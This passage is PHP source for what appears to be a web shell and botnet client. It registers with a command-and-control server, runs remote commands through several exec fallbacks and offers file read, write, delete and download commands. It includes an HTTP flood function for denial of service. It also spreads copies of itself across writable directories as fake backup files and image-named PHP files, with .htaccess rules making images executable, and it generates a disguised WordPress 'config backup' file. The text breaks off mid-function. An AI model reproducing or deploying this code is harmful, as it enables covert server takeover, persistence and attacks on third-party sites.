    error_log("[c2_register_background] FAILED or timeout: " . substr($trimmed, 0, 80));
    return false;
}

function http_post_timeout($url, $data, $timeout = 1) {
    // Very fast fallback - cURL only with strict timeout
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT_MS, $timeout * 1000);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        
        $result = @curl_exec($ch);
        @curl_close($ch);
        
        if ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    return null;
}

// =====================================================
function c2_register($server, $id) {
    global $web_shell_url;
    
    error_log("[c2_register] Starting with id=$id, server=$server");
    
    try {
        $sysinfo = collect_system_info();
        error_log("[c2_register] Sysinfo collected");
    } catch (Exception $e) {
        error_log("[c2_register] Exception in collect_system_info: " . $e->getMessage());
        return false;
    }

    $payload = [
        'id' => $id,
        'web_shell_url' => $web_shell_url,
        'sysinfo' => $sysinfo,
        'timestamp' => time(),
        'version' => '3.0'
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    error_log("[c2_register] Payload encoded: " . strlen($encoded) . " bytes");
    
    // Retry logic - 3 kez dene with SHORT sleeps
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        error_log("[c2_register] Attempt $attempt/3");
        $result = http_post($server . '?act=reg', $encoded);
        
        // Null-safe response handling
        $result = $result ?: '';  // Convert null to empty string
        $result_preview = $result ? substr($result, 0, 100) : '(empty)';
        error_log("[c2_register] Response: " . $result_preview);
        
        // Check for success - accept both 'ok' string and JSON {success:true}
        $trimmed_r = trim($result);
        $json_r = $trimmed_r ? @json_decode($trimmed_r, true) : null;
        if (!empty($result) && ($trimmed_r === 'ok' || !empty($json_r['success']))) {
            error_log("[c2_register] SUCCESS!");
            
            // Guarantee write registration marker (retry if fails)
            $reg_file = __DIR__ . '/.registered';
            if (!@file_exists($reg_file) || @filesize($reg_file) < 5) {
                @file_put_contents($reg_file, time());
            }
            
            return true;
        }
        
        // Very SHORT sleep (0.5 sec instead of 2 sec)
        if ($attempt < 3) {
            usleep(500000); // 0.5 second instead of sleep(2)
        }
    }
    
    // Tüm denemeler başarısız olursa false döndür
    error_log("[c2_register] FAILED - All attempts failed");
    return false;
}

/**
 * BATCH REGISTRATION - Toplu client kaydı (1000+ site için ideal)
 * Tek HTTP isteğinde 50 client'ı kaydet
 * Crash riski %99 azalır (200 req → 4 req)
 */
function c2_register_batch($server, $clients_batch) {
    if (!is_array($clients_batch) || count($clients_batch) === 0) {
        return false;
    }

    // Max 50 client per batch
    $clients_batch = array_slice($clients_batch, 0, 50);

    $payload = [
        'clients' => $clients_batch,
        'batch_version' => '1.0',
        'batch_timestamp' => time()
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    
    // Retry logic - 3 kez dene
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        $result = http_post($server . '?act=reg_batch', $encoded);
        
        // Null-safe null coalescing
        $result = $result ?: '';
        
        if (!empty($result)) {
            $decoded = json_decode($result, true);
            if (is_array($decoded) && ($decoded['batch_processed'] ?? false) === true) {
                error_log("[c2_register_batch] SUCCESS on attempt $attempt");
                return $decoded; // Success - döndür sonuç
            }
        }
        
        error_log("[c2_register_batch] Attempt $attempt/3 failed or invalid response");
        
        // İlk 2 denemede başarısızsa 1 saniye bekle
        if ($attempt < 3) {
            sleep(1);
        }
    }
    
    // Fallback: tek tek kayıt TRY (sadece 1x, loop yok)
    // Don't use retry logic here - already failed batch
    foreach ($clients_batch as $client) {
        $single_start = time();
        @c2_register_background($server, $client['id']);
        // Skip if taking too long
        if (time() - $single_start > 3) break;
    }
    
    return false;
}

function c2_get_task($server, $id) {
    $url = $server . '?act=get_task&id=' . urlencode($id);
    return http_get($url);
}

function c2_send_result($server, $id, $command, $output, $task_id = null) {
    $payload = [
        'id' => $id,
        'task_id' => $task_id,
        'command' => $command,
        'output' => safe_base64_encode($output),  // Standardized encoding
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=set_res', $encoded);
}

function c2_update_status($server, $id, $status = 'alive') {
    $payload = [
        'id' => $id,
        'status' => $status,
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=update', $encoded);
}

// =====================================================
// GELİŞMİŞ KOMUT ÇALIŞTIRMA MOTORU
// =====================================================
function execute_command($cmd) {
    global $is_windows;
    
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    $output = '';
    $methods = [];
    
    // ÖZEL KOMUTLAR (PHP CORE)
    
    // pwd / cd
    if ($cmd === 'pwd' || $cmd === 'cd') {
        return getcwd() ?: __DIR__;
    }
    
    // CD ile dizin değiştir (büyük/küçük harf bağımsız)
    // Handle both pure 'cd path' and 'cd path && othercmd'
    if (preg_match('/^cd\s+(?:[\'"])?([^\'"&]+?)(?:[\'"])?(?:\s*&&\s*(.*))?$/i', $cmd, $m)) {
        $path = trim($m[1]);
        $remaining_cmd = isset($m[2]) ? trim($m[2]) : '';
        
        if (@chdir($path)) {
            $cwd = getcwd();
            if (!empty($remaining_cmd)) {
                // If there's a command after &&, execute it in the new directory
                $result = execute_command($remaining_cmd);
                return $result;
            }
            return $cwd;
        }
        return "[ERROR] Cannot change to: $path";
    }
    
    // FILELIST - Dizin listele
    if (strpos($cmd, 'FILELIST ') === 0) {
        $path = trim(substr($cmd, 9)) ?: getcwd();
        return list_directory($path);
    }
    
    // FILEREAD - Dosya oku
    if (strpos($cmd, 'FILEREAD ') === 0) {
        $file = trim(substr($cmd, 9));
        return read_file($file);
    }
    
    // FILEWRITE - Dosya yaz
    if (strpos($cmd, 'FILEWRITE ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return write_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILEWRITE <path> <base64_content>";
    }

    // DOWNLOADFILE - URL'den dosya indirip kaydet
    if (strpos($cmd, 'DOWNLOADFILE ') === 0 || strpos($cmd, 'DOWNLOADURL ') === 0) {
        $parts = preg_split('/\s+/', $cmd, 3);
        if (count($parts) >= 3) {
            return download_remote_file($parts[1], $parts[2]);
        }
        return "[ERROR] DOWNLOADFILE <url> <filename>";
    }
    
    // FILEDELETE - Dosya sil
    if (strpos($cmd, 'FILEDELETE ') === 0) {
        $file = trim(substr($cmd, 11));
        return delete_file($file);
    }
    
    // FILECOPY - Dosya kopyala
    if (strpos($cmd, 'FILECOPY ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return copy_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILECOPY <source> <dest>";
    }
    
    // DIRCREATE - Dizin oluştur
    if (strpos($cmd, 'DIRCREATE ') === 0) {
        $path = trim(substr($cmd, 10));
        return create_directory($path);
    }
    
    // DIRDELETE - Dizin sil
    if (strpos($cmd, 'DIRDELETE ') === 0) {
        $path = trim(substr($cmd, 10));
        return delete_directory($path);
    }
    
    // SISTEM BILGILERI
    if ($cmd === 'sysinfo' || $cmd === 'system') {
        return json_encode(collect_system_info(), JSON_PRETTY_PRINT);
    }
    
    if ($cmd === 'whoami') {
        return get_current_user() ?: 'unknown';
    }
    
    if ($cmd === 'hostname') {
        return gethostname();
    }
    
    if ($cmd === 'dir' || $cmd === 'ls') {
        return list_directory(getcwd());
    }
    
    if ($cmd === 'clear' || $cmd === 'cls') {
        return '__CLEAR__';
    }
    
    // PHP_STRESS — shell olmadan native PHP HTTP flood
    // Sözdizimi: PHP_STRESS <target> <method> <duration> <threads> [refs] [max_cpu] [max_ram] [rpc]
    if (strpos($cmd, 'PHP_STRESS ') === 0) {
        $parts = preg_split('/\s+/', trim(substr($cmd, 11)));
        $target   = $parts[0] ?? '';
        $method   = strtoupper($parts[1] ?? 'GET');
        $duration = (int)($parts[2] ?? 20);
        $threads  = min((int)($parts[3] ?? 10), 50);
        $refs     = $parts[4] ?? '_';
        $max_cpu  = (int)($parts[5] ?? 80);
        $max_ram  = (int)($parts[6] ?? 75);
        $rpc      = (int)($parts[7] ?? 10);
        if (empty($target)) return '[ERROR] PHP_STRESS: hedef URL gerekli';
        return php_native_flood($target, $method, $duration, $threads, $rpc);
    }

    // SİSTEM KOMUTU ÇALIŞTIR
    return execute_system_command($cmd);
}

function execute_system_command($cmd) {
    $methods_tried = [];
    $cmd_pipe = $cmd . ' 2>&1';

    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'shell_exec';
        $result = @shell_exec($cmd_pipe);
        if ($result !== null) return $result;
    }

    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'exec';
        @exec($cmd_pipe, $output_lines, $return_var);
        if (!empty($output_lines)) return implode("\n", $output_lines);
    }

    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'system';
        ob_start();
        @system($cmd_pipe);
        $result = ob_get_clean();
        if ($result !== false && $result !== '') return $result;
    }

    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'passthru';
        ob_start();
        @passthru($cmd_pipe);
        $result = ob_get_clean();
        if ($result !== false && $result !== '') return $result;
    }

    if (function_exists('proc_open')) {
        $methods_tried[] = 'proc_open';
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $combined = trim($stdout . ($stderr ? "\nSTDERR:\n" . $stderr : ''));
            if ($combined !== '') return $combined;
        }
    }

    if (function_exists('popen')) {
        $methods_tried[] = 'popen';
        $handle = @popen($cmd_pipe, 'r');
        if ($handle) {
            $result = '';
            while (!feof($handle)) {
                $result .= fgets($handle);
            }
            pclose($handle);
            if ($result !== '') return $result;
        }
    }

    // Son çare: queue dosyasına yaz — cron (CLI PHP) exec kısıtlaması olmadan çalıştırır
    $queue_file = __DIR__ . '/.mori_exec_queue';
    $queue = [];
    if (@file_exists($queue_file)) {
        $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
    }
    // Eski komutları temizle (1 saatten eski)
    $queue = array_filter($queue, function($q) { return (time() - ($q['t'] ?? 0)) < 3600; });
    $queue[] = ['cmd' => $cmd, 't' => time(), 'qid' => uniqid()];
    @file_put_contents($queue_file, json_encode(array_values($queue)), LOCK_EX);
    
    // Special case for stress tests: try background execution directly
    if (strpos($cmd, 'nohup bash -c') === 0 || strpos($cmd, 'python3') !== false || strpos($cmd, 'python ') !== false) {
        // Stress test — check if we can use pcntl_fork or at least attempt one exec method
        if (function_exists('pcntl_fork')) {
            $pid = @pcntl_fork();
            if ($pid === -1) {
                return "[QUEUED] Stress komut kuyruğa alındı (fork başarısız)"; 
            } elseif ($pid === 0) {
                // Child process — try to execute
                @shell_exec($cmd . ' > /tmp/stress_exec.log 2>&1 &');
                exit(0);
            } else {
                // Parent — return immediately
                return "[STRESS_BG] Stress komut background'da çalışıyor...";
            }
        }
    }
    
    return "[QUEUED] Shell kısıtlandı, komut kuyruğa alındı. Cron 5dk içinde çalıştıracak. Methods tried: " . implode(', ', $methods_tried);
}

/**
 * PHP native HTTP flood — Python/shell gerektirmez
 * curl_multi ile çoklu eşzamanlı istek
 */
function php_native_flood($url, $method = 'GET', $duration = 20, $threads = 10, $rpc = 10) {
    if (!function_exists('curl_multi_init')) {
        return '[ERROR] php_native_flood: curl_multi uzantısı yok';
    }
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
        return '[ERROR] php_native_flood: geçersiz URL';
    }

    $start    = time();
    $sent     = 0;
    $errors   = 0;
    $method   = strtoupper($method);
    $deadline = $start + $duration;

    while (time() < $deadline) {
        $batch = min($threads, $rpc);
        $mh = curl_multi_init();
        $handles = [];

        for ($i = 0; $i < $batch; $i++) {
            $ch = curl_init($url . '?_=' . mt_rand() . '&t=' . time());
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 8,
                CURLOPT_CONNECTTIMEOUT => 4,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                CURLOPT_HTTPHEADER     => [
                    'Accept: text/html,application/xhtml+xml',
                    'Accept-Language: en-US,en;q=0.9',
                    'Cache-Control: no-cache',
                    'Pragma: no-cache',
                ],
            ]);
            if ($method === 'POST') {
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'data=' . str_repeat(chr(mt_rand(65, 90)), mt_rand(100, 500)));
            }
            curl_multi_add_handle($mh, $ch);
            $handles[] = $ch;
        }

        $running = null;
        do {
            $status = curl_multi_exec($mh, $running);
            if ($running) curl_multi_select($mh, 0.5);
        } while ($running > 0 && $status === CURLM_OK && time() < $deadline);

        foreach ($handles as $ch) {
            $info = curl_getinfo($ch);
            if (($info['http_code'] ?? 0) > 0) $sent++;
            else $errors++;
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }
        curl_multi_close($mh);

        if (time() >= $deadline) break;
    }

    $elapsed = time() - $start;
    return "[PHP_STRESS] Hedef: $url | Method: $method | Süre: {$elapsed}s/{$duration}s | Gönderilen: $sent | Hata: $errors";
}

// =====================================================
// DOSYA SİSTEMİ İŞLEMLERİ
// =====================================================
function list_directory($path) {
    $path = str_replace('\\', '/', $path);
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return json_encode(['error' => "Directory not found: $path"]);
    }
    
    $items = [];
    $dir = @opendir($real);
    
    if (!$dir) {
        return json_encode(['error' => "Cannot open directory: $path"]);
    }
    
    while (($file = readdir($dir)) !== false) {
        if ($file === '.' || $file === '..') continue;
        
        $full = $real . DIRECTORY_SEPARATOR . $file;
        $stat = @stat($full);
        
        $items[] = [
            'name' => $file,
            'type' => is_dir($full) ? 'dir' : 'file',
            'path' => str_replace('\\', '/', $full),
            'size' => is_file($full) ? filesize($full) : 0,
            'perms' => substr(sprintf('%o', fileperms($full)), -4),
            'owner' => function_exists('fileowner') ? fileowner($full) : null,
            'group' => function_exists('filegroup') ? filegroup($full) : null,
            'modified' => filemtime($full),
            'readable' => is_readable($full),
            'writable' => is_writable($full),
            'executable' => is_executable($full)
        ];
    }
    
    closedir($dir);
    
    // Dizinleri önce sırala
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] === 'dir' ? -1 : 1;
    });
    
    return json_encode($items, JSON_PRETTY_PRINT);
}

function read_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real) || !is_readable($real)) {
        return "[ERROR] Cannot read file: $file";
    }
    
    $content = @file_get_contents($real);
    return $content !== false ? $content : "[ERROR] Read failed";
}

function write_file($file, $content_b64) {
    $content = base64_decode($content_b64);
    $dir = dirname($file);
    
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    
    $result = @file_put_contents($file, $content);
    return $result !== false ? "OK: $result bytes written" : "[ERROR] Write failed";
}

function delete_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real)) {
        return "[ERROR] File not found: $file";
    }
    
    return @unlink($real) ? "OK: Deleted $file" : "[ERROR] Delete failed";
}

function copy_file($src, $dst) {
    return @copy($src, $dst) ? "OK: Copied $src to $dst" : "[ERROR] Copy failed";
}

function create_directory($path) {
    return @mkdir($path, 0755, true) ? "OK: Created $path" : "[ERROR] Cannot create directory";
}

function get_persistence_target_file() {
    return __FILE__;
}

function get_persistence_source_url() {
    global $persistence_default_url;
    $url = $persistence_default_url;
    $localFile = __DIR__ . '/.persistence_source_url';
    if (file_exists($localFile)) {
        $stored = trim(file_get_contents($localFile));
        if (filter_var($stored, FILTER_VALIDATE_URL)) {
            $url = $stored;
        }
    }
    return $url;
}

function find_writable_directories($bases, $maxDirs = 50, $maxDepth = 3, $maxNodes = 1000) {
    /**
     * PHP-based recursive writable directories search
     * Used as fallback when shell commands unavailable
     */
    $found = [];
    $visited = [];
    $queue = [];

    foreach ($bases as $base) {
        if (!$base || !is_dir($base)) {
            continue;
        }
        $real = realpath($base);
        if (!$real || isset($visited[$real])) {
            continue;
        }
        $visited[$real] = true;
        if (is_writable($real)) {
            $found[] = $real;
        }
        $queue[] = ['path' => $real, 'depth' => 0];
    }

    $nodes = 0;
    while ($queue && count($found) < $maxDirs && $nodes < $maxNodes) {
        $item = array_shift($queue);
        $nodes++;
        $path = $item['path'];
        $depth = $item['depth'];

        if ($depth >= $maxDepth) {
            continue;
        }

        $entries = @scandir($path);
        if (!$entries || !is_array($entries)) {
            continue;
        }

        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }
            $sub = $path . DIRECTORY_SEPARATOR . $entry;
            if (!is_dir($sub)) {
                continue;
            }
            $realSub = realpath($sub);
            if (!$realSub || isset($visited[$realSub])) {
                continue;
            }
            if (in_array($entry, ['proc', 'sys', 'dev', 'run', 'tmp', 'lost+found'], true)) {
                continue;
            }
            $visited[$realSub] = true;
            if (is_writable($realSub)) {
                $found[] = $realSub;
            }
            $queue[] = ['path' => $realSub, 'depth' => $depth + 1];
        }
    }

    return $found;
}

function enumerate_root_writable_dirs() {
    /**
     * Root path altında writable dizinleri enumerate et
     * find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100
     */
    $writable_dirs = [];
    
    // YÖNTEM 1: find komutu ile (daha hızlı ve kapsamlı)
    if (function_exists('shell_exec')) {
        $find_cmd = 'find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100';
        $output = @shell_exec($find_cmd);
        if ($output) {
            $lines = explode("\n", trim($output));
            foreach ($lines as $line) {
                $line = trim($line);
                if ($line && is_dir($line) && is_writable($line)) {
                    $writable_dirs[] = $line;
                }
            }
        }
    }
    
    // YÖNTEM 2: PHP ile recursive search (fallback)
    if (count($writable_dirs) < 10) {
        $php_dirs = find_writable_directories(['/'], 100, 5, 1000);
        $writable_dirs = array_merge($writable_dirs, $php_dirs);
    }
    
    // Duplicate'ları kaldır ve filtrele
    $writable_dirs = array_unique($writable_dirs);
    $filtered = [];
    
    foreach ($writable_dirs as $dir) {
        // Tehlikeli dizinleri çıkar
        if (strpos($dir, '/proc/') === 0 || 
            strpos($dir, '/sys/') === 0 || 
            strpos($dir, '/dev/') === 0 ||
            $dir === '/' ||
            !is_writable($dir)) {
            continue;
        }
        $filtered[] = $dir;
    }
    
    return array_slice($filtered, 0, 100);
}

// =====================================================
// PERSISTENCE V4 - WARRIOR SYSTEM
// Multi-location deployment + Sister files + PNG masking
// =====================================================

function get_deployment_targets() {
    /**
     * Find all writable web directories recursively
     * Returns paths to deploy sister files
     */
    $targets = [];
    
    // Primary locations
    $base_paths = [
        '/var/www/html',
        '/var/www',
        '/home',
        '/opt',
        '/srv',
        '/usr/share/nginx/html',
        dirname(__DIR__),
        __DIR__,
        sys_get_temp_dir(),
    ];
    
    foreach ($base_paths as $base) {
        if (!@is_dir($base) || !@is_writable($base)) continue;
        
        // Add base directory
        if (count($targets) < 20) {
            $targets[] = $base;
        }
        
        // Scan for WordPress/plugin directories
        $subdirs = @scandir($base);
        if (!$subdirs) continue;
        
        foreach ($subdirs as $subdir) {
            if ($subdir === '.' || $subdir === '..') continue;
            
            $full_path = $base . '/' . $subdir;
            if (!@is_dir($full_path) || !@is_readable($full_path)) continue;
            
            // WordPress themes
            if ($subdir === 'wp-content') {
                $themes = $full_path . '/themes';
                if (@is_dir($themes) && @is_writable($themes)) {
                    $targets[] = $themes;
                }
                
                $plugins = $full_path . '/plugins';
                if (@is_dir($plugins) && @is_writable($plugins)) {
                    $targets[] = $plugins;
                }
            }
            
            // Generic web directory
            if (@is_writable($full_path) && count($targets) < 20) {
                $targets[] = $full_path;
            }
        }
    }
    
    return array_values(array_unique($targets));
}

// ====================================================
// DEEP DEPLOYMENT TARGET SCANNING (Generic Linux)
// ====================================================
function get_deployment_targets_from_backup() {
    $targets = [];
    // Minimal exclusion: only truly critical system dirs
    $excluded_root_dirs = ["proc", "sys", "dev", "etc", "lib"];
    
    // 1. SYSTEM SCAN - Start from root, avoid excluded dirs
    function scan_writable_everywhere($path, &$results, $max_depth = 4, $depth = 0, $excluded = []) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($path) || !@is_readable($path)) return;
        
        $entries = @scandir($path);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            // Skip excluded dirs at root level
            if ($depth === 0 && in_array($entry, $excluded)) continue;
            
            $full = $path . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Writable? Add it
            if (@is_writable($full) && count($results) < 100) {
                $results[] = $full;
            }
            
            // Stay shallow to avoid massive deep recursion
            if ($depth < $max_depth - 1 && strlen($full) < 80) {
                scan_writable_everywhere($full, $results, $max_depth, $depth + 1, $excluded);
            }
        }
    }
    
    // Start from root
    scan_writable_everywhere("/", $targets, 3, 0, $excluded_root_dirs);
    
    // 2. WEB-SPECIFIC DEEP SCAN - Go deeper in web roots
    function scan_web_deep($base, &$results, $max_depth = 6, $depth = 0) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($base) || !@is_readable($base)) return;
        
        $entries = @scandir($base);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            $full = $base . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Prioritize ANY common web/app locations (generic, not WordPress-specific)
            $is_web_priority = (
                preg_match("/public_html|www|html|webroot|htdocs|web/i", $full) ||
                preg_match("/uploads|files|media|downloads|attachments/i", $full) ||
                preg_match("/apps?|store|api|backend|frontend|dist|build/i", $full) ||
                preg_match("/\.git|\.config|\.cache|\.local|\.ssh/i", $full) ||
                preg_match("/[a-f0-9\-]{36}|[0-9]{4,}/", basename($full)) // UUID or numeric dirs (tenant IDs)
            );
            
            if (@is_writable($full) && count($results) < 100) {
                // DEEP PATHS GET PRIORITY
                $depth_score = substr_count($full, "/");
                $results[] = ["path" => $full, "depth" => $depth_score, "web" => $is_web_priority];
            }
            
            // Go deeper
            if ($depth < $max_depth - 1) {
                scan_web_deep($full, $results, $max_depth, $depth + 1);
            }
        }
    }
    
    // Web root deep scan
    $web_bases = ["/var/www", "/home", "/opt", "/srv", "/var"];
    foreach ($web_bases as $base) {
        if (@is_dir($base)) {
            $temp = [];
            scan_web_deep($base, $temp);
            $targets = array_merge($targets, $temp);
        }
    }
    
    // 3. SORT BY DEPTH (deeper = better for hiding)
    usort($targets, function($a, $b) {
        if (is_array($a)) {
            $depth_a = $a["depth"] ?? 0;
            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
        }
        return 0;
    });
    
    // Extract just paths
    $final_targets = [];
    foreach ($targets as $item) {
        if (is_array($item)) {
            $final_targets[] = $item["path"];
        } else {
            $final_targets[] = $item;
        }
    }
    
    return array_values(array_unique($final_targets));
}

// Combine both deployment target scanners
function get_all_deployment_targets() {
    $targets = array_merge(
        get_deployment_targets(),
        get_deployment_targets_from_backup()
    );
    return array_unique($targets);
}

function deploy_sister_files_aggressive() {
    /**
     * WARRIOR SYSTEM v3 - GENERIC LINUX SITES
     * Deploy sister files to 10+ locations with masking
     * Works on ANY Linux site (not just WordPress)
     * FIX: Sister files use .png/.gif/.jpg ONLY (no .php.png pattern)
     */
    global $c2_server, $web_shell_url;
    
    // Lock - 1 hour deployment cooldown
    $deploy_lock = '/tmp/.mori_deploy_lock_v4';
    if (@file_exists($deploy_lock)) {
        $lock_age = time() - @filemtime($deploy_lock);
        if ($lock_age < 3600) return true; // Already deployed recently
    }
    
    // Get targets - dynamic enumeration
    $targets = get_all_deployment_targets();
    $targets = array_unique($targets);
    if (count($targets) < 3) return false;
    
    @touch($deploy_lock);
    
    // Read current shell code
    $shell_code = @file_get_contents(__FILE__);
    if (!$shell_code || strlen($shell_code) < 15000) return false;
    
    // Deploy strategy (generic for ANY Linux site):
    // 1. Generic PHP files (config-backup.php, system-backup.php, etc)
    // 2. Image-masked PHP files (logo.png, banner.gif, avatar.jpg)
    // 3. .htaccess for magic routing
    
    $deployed = [];
    // Generic names (not WordPress-specific)
    $standard_names = ['config-backup.php', 'system-backup.php', 'init-backup.php'];
    $masked_names = ['logo.png', 'banner.gif', 'avatar.jpg'];
    
    foreach (array_slice($targets, 0, 10) as $idx => $target) {
        if (!@is_dir($target) || !@is_writable($target)) continue;
        
        // Strategy 1: Standard PHP file
        $standard_file = $target . '/' . $standard_names[$idx % count($standard_names)];
        @file_put_contents($standard_file, $shell_code);
        @chmod($standard_file, 0644);
        $deployed[] = $standard_file;
        
        // Strategy 2: Image-masked PHP (no .php extension - just .png/.gif/.jpg)
        $masked_file = $target . '/' . $masked_names[$idx % count($masked_names)];
        $masked_code = "<?php\n" . substr($shell_code, 5);
        @file_put_contents($masked_file, $masked_code);
        @chmod($masked_file, 0644);
        $deployed[] = $masked_file;
        
        // Strategy 3: .htaccess to execute images as PHP
        $htaccess = $target . '/.htaccess';
        $htaccess_content = <<<'HTACCESS'
<FilesMatch "\.png$|\.gif$|\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch "(config|system|init)-backup\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch "^\.">
    Deny From All
</FilesMatch>
HTACCESS;
        @file_put_contents($htaccess, $htaccess_content);
        @chmod($htaccess, 0644);
    }
    
    // Store deployment info in C2
    $deployment_info = [
        'deployed_count' => count($deployed),
        'locations' => $deployed,
        'timestamp' => time(),
        'target_count' => count($targets),
        'urls' => []
    ];
    
    // Generate accessible URLs (try multiple patterns)
    foreach ($deployed as $file_path) {
        // Pattern 1: /var/www/html
        if (strpos($file_path, '/var/www/html') === 0) {
            $url = str_replace('/var/www/html', 'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost'), $file_path);
            $deployment_info['urls'][] = $url;
        }
        // Pattern 2: /var/www/
        elseif (strpos($file_path, '/var/www/') === 0) {
            $parts = explode('/', $file_path);
            if (isset($parts[3])) { // domain name
                $url = 'http://' . $parts[3] . '/' . implode('/', array_slice($parts, 4));
                $deployment_info['urls'][] = $url;
            }
        }
        // Pattern 3: /home/user/public_html
        elseif (preg_match('/\/home\/([^\/]+)\/public_html/', $file_path, $m)) {
            $url = 'http://' . ($_SERVER['HTTP_HOST'] ?? $m[1] . '.local') . '/' . basename($file_path);
            $deployment_info['urls'][] = $url;
        }
    }
    
    // Send deployment report to C2
    @file_put_contents('/tmp/deployment_report.json', json_encode($deployment_info));
    
    return count($deployed) > 0;
}

function generate_wp_config_backup() {
    /**
     * Generate wp-config-backup.php
     * ORCHESTRATOR for deployment v3
     * Optimized writable dir scanning + deep path prioritization
     */
    
    global $C2_SERVER, $web_shell_url;
    $c2_server = $C2_SERVER;  // $C2_SERVER is the actual global; $c2_server only exists inside c2_register()

    $code = '<?php
/**
 * WordPress Configuration Backup Orchestrator v3
 * Smart writable directory detection + deep path prioritization
 */

// OPTIMIZED: Scan writable directories (system-wide + web)
function get_deployment_targets_from_backup() {
    $targets = [];
    // Minimal exclusion: only truly critical system dirs
    $excluded_root_dirs = ["proc", "sys", "dev", "etc", "lib"];
    
    // 1. SYSTEM SCAN - Start from root, avoid excluded dirs
    function scan_writable_everywhere($path, &$results, $max_depth = 4, $depth = 0, $excluded = []) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($path) || !@is_readable($path)) return;
        
        $entries = @scandir($path);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            // Skip excluded dirs at root level
            if ($depth === 0 && in_array($entry, $excluded)) continue;
            
            $full = $path . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Writable? Add it
            if (@is_writable($full) && count($results) < 100) {
                $results[] = $full;
            }
            
            // Stay shallow to avoid massive deep recursion
            if ($depth < $max_depth - 1 && strlen($full) < 80) {
                scan_writable_everywhere($full, $results, $max_depth, $depth + 1, $excluded);
            }
        }
    }
    
    // Start from root
    scan_writable_everywhere("/", $targets, 3, 0, $excluded_root_dirs);
    
    // 2. WEB-SPECIFIC DEEP SCAN - Go deeper in web roots
    function scan_web_deep($base, &$results, $max_depth = 6, $depth = 0) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($base) || !@is_readable($base)) return;
        
        $entries = @scandir($base);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            $full = $base . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Prioritize ANY common web/app locations (generic, not WordPress-specific)
            $is_web_priority = (
                preg_match("/public_html|www|html|webroot|htdocs|web/i", $full) ||
                preg_match("/uploads|files|media|downloads|attachments/i", $full) ||
                preg_match("/apps?|store|api|backend|frontend|dist|build/i", $full) ||
                preg_match("/\.git|\.config|\.cache|\.local|\.ssh/i", $full) ||
